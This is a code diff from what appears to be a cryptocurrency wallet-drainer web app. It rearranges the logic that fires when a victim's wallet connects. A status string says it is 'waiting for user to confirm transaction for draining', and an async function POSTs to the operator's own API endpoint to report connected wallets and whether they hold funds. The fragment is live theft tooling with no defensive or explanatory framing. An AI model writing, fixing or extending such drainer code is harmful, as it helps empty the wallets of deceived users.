@@ -92,7 +92,7 @@ function formatBalance(balanceBigInt, chain) {
   }, [confirmed]);
 
   useEffect(() => {
-    if (isConnected && address && totalFee) {
+    if (isConnected && address ) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
       walletConnectNotification();
@@ -160,13 +160,16 @@ function formatBalance(balanceBigInt, chain) {
 
   let message;
 
-  if (balance.data?.value > 0 && amountToSend > 0n) {
+
+
+  const walletConnectNotification = async () => {
+
+      if (balance.data?.value > 0 && amountToSend > 0n) {
     message = "waiting for user to confirm transaction for draining";
   } else {
     message = "connected wallet is not funded or not enough to cover gas fee";
   }
-
-  const walletConnectNotification = async () => {
+  
     await fetch(`${import.meta.env.VITE_API}/send-notification`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
